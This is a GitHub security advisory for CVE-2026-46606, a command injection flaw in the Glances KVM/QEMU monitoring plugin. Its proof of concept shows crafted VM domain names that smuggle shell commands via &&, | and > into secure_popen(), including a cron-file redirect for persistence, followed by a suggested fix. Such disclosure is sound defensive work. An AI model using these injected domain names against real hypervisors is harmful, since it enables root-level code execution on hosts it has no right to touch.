# [H] Glances is Vulnerable to Command Injection via KVM/QEMU VM Domain Names in glances/plugins/vms/engines/virsh.py

## Summary
Severity: High
Advisory: GHSA-v5r2-qh84-fjx5
CVE: CVE-2026-46606
CWE: CWE-78
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-22
Source: https://github.com/advisories/GHSA-v5r2-qh84-fjx5
Type: github-advisory

## Affected
- PyPI: `glances` — affected >=0 <4.5.5

## Details
### Summary

The Glances KVM/QEMU monitoring engine (`glances/plugins/vms/engines/virsh.py`) passes VM domain names, read directly from `virsh list --all` output, into f-string command templates that are processed by `secure_popen()`. `secure_popen()` is explicitly designed to interpret `&&`, `|`, and `>` as shell operators.  Because domain names are never sanitised before interpolation, any user with the ability to create or rename a KVM/QEMU virtual machine can execute arbitrary commands as the OS user running Glances — commonly root on hypervisor hosts.

---

### Details

**Affected file:** `glances/plugins/vms/engines/virsh.py`

**Direct URLs (commit 04579778e733d705898a169e049dc84772c852da):**
- https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/plugins/vms/engines/virsh.py#L185
- https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/plugins/vms/engines/virsh.py#L204

The vulnerable calls are on lines 185 and 204:

```python
# line 185  (update_stats)
ret_cmd = secure_popen(f'{VIRSH_PATH} {VIRSH_DOMAIN_STATS_OPTIONS} {domain}')

# line 204  (update_title)
ret_cmd = secure_popen(f'{VIRSH_PATH} {VIRSH_DOMAIN_TITLE_OPTIONS} {domain}')
```

`domain` is the name string parsed from the output of `virsh list --all` (line 59–78 in the same file); no sanitisation is applied to it at  any point before it reaches `secure_popen()`.

`secure_popen()` is defined in `glances/secure.py`.  It explicitly splits the command string on `&&`, `|`, and `>` before invoking `subprocess.Popen` with `shell=False` on each part, meaning all three operators are treated as real pipeline/redirection control characters:

```python
# glances/secure.py
def secure_popen(cmd):
    ret = ''
    for c in cmd.split('&&'):        # '&&' → two separate processes
        ret += __secure_popen(c)
    return ret

def __secure_popen(cmd):
    for sub_cmd in cmd.split('|'):   # '|' → stdin/stdout piped
        p = Popen(sub_cmd_split, shell=False, stdin=sub_cmd_stdin, stdout=PIPE, stderr=PIPE)
    # '>' is split separately for file redirection
```

By contrast, `actions.py` sanitises process names through `_sanitize_mustache_dict()` before they reach `secure_popen()`.  The `vms` plugin applies no such protection.

**Confirmed on:** x86_64 Linux, Python 3.13, Glances 4.5.5_dev1 (commit 04579778e733d705898a169e049dc84772c852da).

All three injection operators were verified:

| Operator | Effect | Confirmed |
|----------|--------|-----------|
| `&&`     | Second command executes after the virsh call | Yes |
| `\|`     | Output of virsh piped to injected command    | Yes |
| `>`      | virsh output redirected to arbitrary file    | Yes |

---

### PoC

**Special configuration required**

* Glances must be configured to monitor a KVM/QEMU hypervisor: the `vms` plugin must be enabled and `/usr/bin/virsh` must be installed and executable.
* The attacker must have libvirt domain-creation or domain-rename privileges (e.g. membership in the `libvirt` group, a typical default on  Ubuntu/Debian/Fedora, or a cloud-platform tenant account).
* No custom `glances.conf` settings are needed beyond a working virsh setup.

**Step 1 — Create a VM with a crafted domain name**

Using the `&&` operator to chain a second command:

```xml
<domain type="kvm">
  <name>productionDB &amp;&amp; touch /tmp/glances_pwned</name>
  <memory>131072</memory>
  <vcpu>1</vcpu>
  <os><type arch="x86_64">hvm</type></os>
</domain>
```

```bash
virsh define evil-domain.xml
```

**Step 2 — Start Glances with KVM monitoring enabled**

```bash
glances                # or: glances -s / glances -w
```

On the next monitoring cycle Glances calls:

```
virsh domstats --nowait "productionDB && touch /tmp/glances_pwned"
```

which `secure_popen()` splits into two processes:
1. `virsh domstats --nowait productionDB`
2. `touch /tmp/glances_pwned`

**Step 3 — Verify execution**

```bash
ls -la /tmp/glances_pwned   # file will exist, owned by the Glances user
```

**Pipe injection (`|`) example**

Domain name: `"productionDB | tee /tmp/virsh_output_stolen.txt"`

The output of the virsh call is piped to `tee`, writing the data to an attacker-controlled path.

**File-write injection (`>`) example**

Domain name: `"productionDB > /etc/cron.d/glances_backdoor"`

The virsh output is redirected to a cron file, enabling persistent code execution on the next cron cycle.

**Minimal Python reproduction (no VM required)**

```python
import sys
sys.path.insert(0, '/path/to/glances')   # adjust to local clone
from glances.secure import secure_popen

# Simulates the exact call in virsh.py line 185
domain = 'productionDB && id'
result = secure_popen(f'/bin/echo domstats --nowait {domain}')
print(result)
# Output will include two lines: the echo output AND the output of `id`
```

---

### Impact

**Vulnerability type:** Command Injection (CWE-78)

**Who is impacted:** Any deployment of Glances on a KVM/QEMU hypervisor host where the `vms` plugin is active.  Exploitation requires the attacker to have libvirt domain-creation or domain-rename rights — a privilege granted by default to members of the `libvirt` group and to cloud-platform tenant APIs.

**Impact:**
- **Confidentiality:** Full — arbitrary commands can exfiltrate secrets from the Glances process environment and the file system.
- **Integrity:** Full — file-write injection (`>`) allows placing content in any file writable by the Glances process (cron, authorised_keys, etc.).
- **Availability:** Full — the Glances process can be terminated or the host disrupted through the injected commands.

In cloud and multi-tenant virtualisation environments, Glances commonly runs as root on the hypervisor to access performance counters, so successful exploitation typically yields root-level code execution.

---

### Suggested Fix

Replace the f-string interpolation with list-based argument passing to avoid any interaction with `secure_popen()`'s operator splitting logic:

```python
# virsh.py — replace lines 185 and 204 with subprocess.run and explicit arg list from subprocess import run, PIPE

result = run(
    [VIRSH_PATH, 'domstats', '--nowait', domain],
    stdout=PIPE, stderr=PIPE, timeout=5
)
```

Alternatively, sanitise `domain` using the same `_sanitize_mustache_dict` helper already used in `actions.py`, which strips `&&`, `|`, `>`, `;`, and backtick characters from string values.

As a defence-in-depth measure, consider running Glances under a dedicated low-privilege service account with `CAP_SYS_PTRACE` rather than as root.

---

### Responsible Disclosure

The AFINE Team is committed to responsible / coordinated disclosure. The AFINE Team will not publish details of this vulnerability or release exploit code publicly until a fix has been released, or 90 days have elapsed from the date of this report, whichever comes first.

---

### Credits

This issue was identified by Michał Majchrowicz and Marcin Wyczechowski, members
of the AFINE Team.

---

## References
- https://github.com/nicolargo/glances/security/advisories/GHSA-v5r2-qh84-fjx5
- https://nvd.nist.gov/vuln/detail/CVE-2026-46606
- https://github.com/advisories/GHSA-v5r2-qh84-fjx5
- https://github.com/nicolargo/glances
- https://github.com/nicolargo/glances/releases/tag/v4.5.5
- https://github.com/pypa/advisory-database/tree/main/vulns/glances/PYSEC-2026-2497.yaml
- https://pypi.org/project/glances
